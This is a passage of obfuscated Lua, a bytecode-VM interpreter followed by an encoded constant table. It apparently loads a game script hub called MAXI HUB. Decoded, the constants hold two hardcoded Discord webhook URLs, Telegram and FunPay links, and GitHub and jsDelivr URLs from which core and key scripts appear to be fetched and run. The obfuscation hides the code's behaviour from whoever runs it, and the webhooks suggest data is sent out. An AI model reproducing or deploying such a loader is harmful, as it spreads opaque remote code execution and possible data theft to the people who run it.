							VIP = VIP + 1;
							Inst = Instr[VIP];
							B = Inst[3];
							K = Stk[B];
							for Idx = B + 1, Inst[4] do
								K = K .. Stk[Idx];
							end
							Stk[Inst[2]] = K;
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A](Stk[A + 1]);
						else
							local B;
							local T;
							local A;
							Stk[Inst[2]] = {};
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Upvalues[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A] = Stk[A]();
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Upvalues[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							T = Stk[A];
							B = Inst[3];
							for Idx = 1, B do
								T[Idx] = Stk[A + Idx];
							end
						end
					elseif (Enum <= 44) then
						local B;
						local A;
						A = Inst[2];
						B = Stk[Inst[3]];
						Stk[A + 1] = B;
						Stk[A] = B[Inst[4]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = Inst[3];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						A = Inst[2];
						Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = {};
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = Env[Inst[3]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = Upvalues[Inst[3]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						A = Inst[2];
						Stk[A] = Stk[A](Stk[A + 1]);
						VIP = VIP + 1;
						Inst = Instr[VIP];
						if Stk[Inst[2]] then
							VIP = VIP + 1;
						else
							VIP = Inst[3];
						end
					elseif (Enum == 45) then
						if not Stk[Inst[2]] then
							VIP = VIP + 1;
						else
							VIP = Inst[3];
						end
					else
						do
							return Stk[Inst[2]];
						end
					end
				elseif (Enum <= 69) then
					if (Enum <= 57) then
						if (Enum <= 51) then
							if (Enum <= 48) then
								if (Enum > 47) then
									local Edx;
									local Results;
									local A;
									Stk[Inst[2]] = Env[Inst[3]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Stk[Inst[3]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									A = Inst[2];
									Results = {Stk[A](Unpack(Stk, A + 1, Inst[3]))};
									Edx = 0;
									for Idx = A, Inst[4] do
										Edx = Edx + 1;
										Stk[Idx] = Results[Edx];
									end
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Stk[Inst[3]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Stk[Inst[3]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									if Stk[Inst[2]] then
										VIP = VIP + 1;
									else
										VIP = Inst[3];
									end
								else
									local A = Inst[2];
									local Results = {Stk[A](Unpack(Stk, A + 1, Inst[3]))};
									local Edx = 0;
									for Idx = A, Inst[4] do
										Edx = Edx + 1;
										Stk[Idx] = Results[Edx];
									end
								end
							elseif (Enum <= 49) then
								local B;
								local T;
								local A;
								Stk[Inst[2]] = Stk[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Upvalues[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = {};
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = {};
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = {};
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Inst[4];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Inst[4];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = {};
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = {};
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Inst[4];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Inst[4];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = {};
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Inst[4];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Inst[4];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = {};
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Inst[4];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Env[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								Stk[A] = Stk[A](Stk[A + 1]);
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Inst[4];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = {};
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Inst[4];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Env[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Inst[4];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = {};
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Inst[4];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Stk[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								Stk[A] = Stk[A]();
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Inst[4];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = {};
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Inst[4];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]][Inst[3]] = Inst[4];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								T = Stk[A];
								B = Inst[3];
								for Idx = 1, B do
									T[Idx] = Stk[A + Idx];
								end
							elseif (Enum > 50) then
								local A;
								Stk[Inst[2]] = Upvalues[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Inst[3];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Upvalues[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
								VIP = VIP + 1;
								Inst = Instr[VIP];
								if Stk[Inst[2]] then
									VIP = VIP + 1;
								else
									VIP = Inst[3];
								end
							else
								Stk[Inst[2]] = Inst[3] ~= 0;
							end
						elseif (Enum <= 54) then
							if (Enum <= 52) then
								local A = Inst[2];
								local B = Stk[Inst[3]];
								Stk[A + 1] = B;
								Stk[A] = B[Inst[4]];
							elseif (Enum == 53) then
								local A = Inst[2];
								do
									return Unpack(Stk, A, Top);
								end
							else
								local B;
								local A;
								Stk[Inst[2]] = Env[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								B = Stk[Inst[3]];
								Stk[A + 1] = B;
								Stk[A] = B[Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Inst[3];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Env[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								B = Stk[Inst[3]];
								Stk[A + 1] = B;
								Stk[A] = B[Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								Stk[A] = Stk[A](Stk[A + 1]);
								VIP = VIP + 1;
								Inst = Instr[VIP];
								if not Stk[Inst[2]] then
									VIP = VIP + 1;
								else
									VIP = Inst[3];
								end
							end
						elseif (Enum <= 55) then
							local A;
							local K;
							local B;
							Stk[Inst[2]] = Stk[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							B = Inst[3];
							K = Stk[B];
							for Idx = B + 1, Inst[4] do
								K = K .. Stk[Idx];
							end
							Stk[Inst[2]] = K;
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A] = Stk[A](Stk[A + 1]);
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Upvalues[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							B = Inst[3];
							K = Stk[B];
							for Idx = B + 1, Inst[4] do
								K = K .. Stk[Idx];
							end
							Stk[Inst[2]] = K;
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
							VIP = VIP + 1;
							Inst = Instr[VIP];
							if Stk[Inst[2]] then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						elseif (Enum > 56) then
							Stk[Inst[2]] = Inst[3] ~= 0;
							VIP = VIP + 1;
						else
							local A = Inst[2];
							local T = Stk[A];
							for Idx = A + 1, Inst[3] do
								Insert(T, Stk[Idx]);
							end
						end
					elseif (Enum <= 63) then
						if (Enum <= 60) then
							if (Enum <= 58) then
								local A;
								Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Inst[3];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Inst[3];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
								VIP = VIP + 1;
								Inst = Instr[VIP];
								if not Stk[Inst[2]] then
									VIP = VIP + 1;
								else
									VIP = Inst[3];
								end
							elseif (Enum == 59) then
								local A;
								Stk[Inst[2]] = Stk[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Inst[3];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								Stk[A] = Stk[A](Stk[A + 1]);
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Stk[Inst[3]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Inst[3];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								Stk[A] = Stk[A](Stk[A + 1]);
							elseif (Stk[Inst[2]] == Stk[Inst[4]]) then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						elseif (Enum <= 61) then
							local A = Inst[2];
							local Cls = {};
							for Idx = 1, #Lupvals do
								local List = Lupvals[Idx];
								for Idz = 0, #List do
									local Upv = List[Idz];
									local NStk = Upv[1];
									local DIP = Upv[2];
									if ((NStk == Stk) and (DIP >= A)) then
										Cls[DIP] = NStk[DIP];
										Upv[1] = Cls;
									end
								end
							end
						elseif (Enum > 62) then
							local A = Inst[2];
							Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
						else
							Stk[Inst[2]] = Wrap(Proto[Inst[3]], nil, Env);
						end
					elseif (Enum <= 66) then
						if (Enum <= 64) then
							local A;
							A = Inst[2];
							Stk[A] = Stk[A]();
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Env[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A] = Stk[A](Stk[A + 1]);
							VIP = VIP + 1;
							Inst = Instr[VIP];
							if (Stk[Inst[2]] == Inst[4]) then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						elseif (Enum == 65) then
							local A = Inst[2];
							Stk[A] = Stk[A](Stk[A + 1]);
						else
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
						end
					elseif (Enum <= 67) then
						local A;
						Stk[Inst[2]] = {};
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = Upvalues[Inst[3]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						A = Inst[2];
						Stk[A] = Stk[A]();
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = Env[Inst[3]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						A = Inst[2];
						Stk[A] = Stk[A](Stk[A + 1]);
						VIP = VIP + 1;
						Inst = Instr[VIP];
						if (Stk[Inst[2]] == Inst[4]) then
							VIP = VIP + 1;
						else
							VIP = Inst[3];
						end
					elseif (Enum > 68) then
						local A = Inst[2];
						Stk[A](Stk[A + 1]);
					else
						local A = Inst[2];
						Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
					end
				elseif (Enum <= 81) then
					if (Enum <= 75) then
						if (Enum <= 72) then
							if (Enum <= 70) then
								local A = Inst[2];
								local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
								Top = (Limit + A) - 1;
								local Edx = 0;
								for Idx = A, Top do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
							elseif (Enum == 71) then
								local B = Inst[3];
								local K = Stk[B];
								for Idx = B + 1, Inst[4] do
									K = K .. Stk[Idx];
								end
								Stk[Inst[2]] = K;
							elseif (Stk[Inst[2]] == Inst[4]) then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						elseif (Enum <= 73) then
							for Idx = Inst[2], Inst[3] do
								Stk[Idx] = nil;
							end
						elseif (Enum == 74) then
							local A;
							local K;
							local B;
							Stk[Inst[2]] = Stk[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							B = Inst[3];
							K = Stk[B];
							for Idx = B + 1, Inst[4] do
								K = K .. Stk[Idx];
							end
							Stk[Inst[2]] = K;
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A] = Stk[A](Stk[A + 1]);
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Upvalues[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							B = Inst[3];
							K = Stk[B];
							for Idx = B + 1, Inst[4] do
								K = K .. Stk[Idx];
							end
							Stk[Inst[2]] = K;
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
							VIP = VIP + 1;
							Inst = Instr[VIP];
							if Stk[Inst[2]] then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						else
							do
								return;
							end
						end
					elseif (Enum <= 78) then
						if (Enum <= 76) then
							local K;
							local B;
							local A;
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Env[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A] = Stk[A](Stk[A + 1]);
							VIP = VIP + 1;
							Inst = Instr[VIP];
							B = Inst[3];
							K = Stk[B];
							for Idx = B + 1, Inst[4] do
								K = K .. Stk[Idx];
							end
							Stk[Inst[2]] = K;
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A](Stk[A + 1]);
						elseif (Enum == 77) then
							Stk[Inst[2]][Stk[Inst[3]]] = Inst[4];
						else
							local A;
							local K;
							local B;
							Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							B = Inst[3];
							K = Stk[B];
							for Idx = B + 1, Inst[4] do
								K = K .. Stk[Idx];
							end
							Stk[Inst[2]] = K;
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A](Unpack(Stk, A + 1, Inst[3]));
						end
					elseif (Enum <= 79) then
						local K;
						local B;
						local A;
						Stk[Inst[2]] = Inst[3];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = Env[Inst[3]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = Stk[Inst[3]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						A = Inst[2];
						Stk[A] = Stk[A](Stk[A + 1]);
						VIP = VIP + 1;
						Inst = Instr[VIP];
						B = Inst[3];
						K = Stk[B];
						for Idx = B + 1, Inst[4] do
							K = K .. Stk[Idx];
						end
						Stk[Inst[2]] = K;
						VIP = VIP + 1;
						Inst = Instr[VIP];
						A = Inst[2];
						Stk[A](Stk[A + 1]);
					elseif (Enum == 80) then
						Stk[Inst[2]] = Env[Inst[3]];
					else
						local A = Inst[2];
						local Results = {Stk[A](Stk[A + 1])};
						local Edx = 0;
						for Idx = A, Inst[4] do
							Edx = Edx + 1;
							Stk[Idx] = Results[Edx];
						end
					end
				elseif (Enum <= 87) then
					if (Enum <= 84) then
						if (Enum <= 82) then
							local Edx;
							local Results, Limit;
							local B;
							local A;
							Stk[Inst[2]] = Env[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Upvalues[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Upvalues[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							B = Stk[Inst[3]];
							Stk[A + 1] = B;
							Stk[A] = B[Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Upvalues[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
							Top = (Limit + A) - 1;
							Edx = 0;
							for Idx = A, Top do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A](Unpack(Stk, A + 1, Top));
							VIP = VIP + 1;
							Inst = Instr[VIP];
							do
								return;
							end
						elseif (Enum > 83) then
							local A;
							Stk[Inst[2]] = Env[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Env[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Stk[A] = Stk[A](Stk[A + 1]);
							VIP = VIP + 1;
							Inst = Instr[VIP];
							if (Stk[Inst[2]] == Inst[4]) then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						else
							local A = Inst[2];
							local C = Inst[4];
							local CB = A + 2;
							local Result = {Stk[A](Stk[A + 1], Stk[CB])};
							for Idx = 1, C do
								Stk[CB + Idx] = Result[Idx];
							end
							local R = Result[1];
							if R then
								Stk[CB] = R;
								VIP = Inst[3];
							else
								VIP = VIP + 1;
							end
						end
					elseif (Enum <= 85) then
						local K;
						local B;
						local A;
						Stk[Inst[2]] = Stk[Inst[3]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						A = Inst[2];
						Stk[A] = Stk[A](Stk[A + 1]);
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = Upvalues[Inst[3]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = Stk[Inst[3]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = Inst[3];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = Stk[Inst[3]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						B = Inst[3];
						K = Stk[B];
						for Idx = B + 1, Inst[4] do
							K = K .. Stk[Idx];
						end
						Stk[Inst[2]] = K;
						VIP = VIP + 1;
						Inst = Instr[VIP];
						A = Inst[2];
						Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
						VIP = VIP + 1;
						Inst = Instr[VIP];
						if Stk[Inst[2]] then
							VIP = VIP + 1;
						else
							VIP = Inst[3];
						end
					elseif (Enum > 86) then
						local B;
						local A;
						Stk[Inst[2]] = Env[Inst[3]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = {};
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = Upvalues[Inst[3]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]][Inst[3]] = Inst[4];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = {};
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]][Inst[3]] = Inst[4];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = Env[Inst[3]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						A = Inst[2];
						B = Stk[Inst[3]];
						Stk[A + 1] = B;
						Stk[A] = B[Inst[4]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]] = Upvalues[Inst[3]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						A = Inst[2];
						Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
						VIP = VIP + 1;
						Inst = Instr[VIP];
						Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
						VIP = VIP + 1;
						Inst = Instr[VIP];
						A = Inst[2];
						Stk[A](Stk[A + 1]);
						VIP = VIP + 1;
						Inst = Instr[VIP];
						do
							return;
						end
					else
						local NewProto = Proto[Inst[3]];
						local NewUvals;
						local Indexes = {};
						NewUvals = Setmetatable({}, {__index=function(_, Key)
							local Val = Indexes[Key];
							return Val[1][Val[2]];
						end,__newindex=function(_, Key, Value)
							local Val = Indexes[Key];
							Val[1][Val[2]] = Value;
						end});
						for Idx = 1, Inst[4] do
							VIP = VIP + 1;
							local Mvm = Instr[VIP];
							if (Mvm[1] == 19) then
								Indexes[Idx - 1] = {Stk,Mvm[3]};
							else
								Indexes[Idx - 1] = {Upvalues,Mvm[3]};
							end
							Lupvals[#Lupvals + 1] = Indexes;
						end
						Stk[Inst[2]] = Wrap(NewProto, NewUvals, Env);
					end
				elseif (Enum <= 90) then
					if (Enum <= 88) then
						Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
					elseif (Enum == 89) then
						local A = Inst[2];
						do
							return Unpack(Stk, A, A + Inst[3]);
						end
					else
						Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
					end
				elseif (Enum <= 91) then
					local A = Inst[2];
					Stk[A] = Stk[A]();
				elseif (Enum > 92) then
					local B;
					local A;
					Stk[Inst[2]] = Env[Inst[3]];
					VIP = VIP + 1;
					Inst = Instr[VIP];
					A = Inst[2];
					B = Stk[Inst[3]];
					Stk[A + 1] = B;
					Stk[A] = B[Inst[4]];
					VIP = VIP + 1;
					Inst = Instr[VIP];
					Stk[Inst[2]] = Inst[3];
					VIP = VIP + 1;
					Inst = Instr[VIP];
					A = Inst[2];
					Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
					VIP = VIP + 1;
					Inst = Instr[VIP];
					Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
					VIP = VIP + 1;
					Inst = Instr[VIP];
					B = Stk[Inst[4]];
					if B then
						VIP = VIP + 1;
					else
						Stk[Inst[2]] = B;
						VIP = Inst[3];
					end
				else
					Upvalues[Inst[3]] = Stk[Inst[2]];
				end
				VIP = VIP + 1;
			end
		end;
	end
	return Wrap(Deserialize(), {}, vmenv)(...);
end
return VMCall("LOL!153Q0003793Q00682Q7470733A2Q2F646973636F72642E636F6D2F6170692F776562682Q6F6B732F313238313235302Q363335342Q3739373537362F2D674B4C57477030426D2D77706E492D4F656C6B354166504777745154676B2Q695342674A764E6250555044384F6E2D516250394D4F4944364E556E4E4764635F39713003793Q00682Q7470733A2Q2F646973636F72642E636F6D2F6170692F776562682Q6F6B732F31342Q302Q322Q3435303539343630333038302F48573965555250525A432Q5277743462547A52412D58346A6B323056626C414C4642555F6A505A7A534C63735964453466444656635A6D5776755F784571737955584D6803153Q00682Q7470733A2Q2F742E6D652F4D4158495F48554203073Q006D61786968756203103Q004D4158492D4855422D6B65792E74787403213Q00682Q7470733A2Q2F66756E7061792E636F6D2F75736572732F363431323534332F033C3Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F6B6F744D613073316E2F6D6178692D6875622F6D61737465722F03363Q00682Q7470733A2Q2F63646E2E6A7364656C6976722E6E65742F67682F6B6F744D613073316E2F6D6178692D687562406D61737465722F03073Q004D61786948756203143Q006D6178692D6875622D636F6E6669672E6A736F6E03113Q006D6178692D6875622D636F72652E6C756103103Q006D6178692D6875622D6B65792E6C756103123Q007265616452656A6F696E4175746F4C6F616403123Q00726567697374657252656A6F696E482Q6F6B03153Q004D617869487562526567697374657252656A6F696E030E3Q004D617869487562536B69704B65792Q0103113Q004D61786948756255694C616E677561676503053Q007063612Q6C03043Q007761726E03273Q005B4D415849204855425D20D09ED188D0B8D0B1D0BAD0B020D0B7D0B0D0BFD183D181D0BAD0B03A006B3Q0012423Q00013Q00122Q000100023Q00122Q000200033Q00122Q000300043Q00122Q000400053Q00122Q000500063Q00122Q000600073Q00122Q000700083Q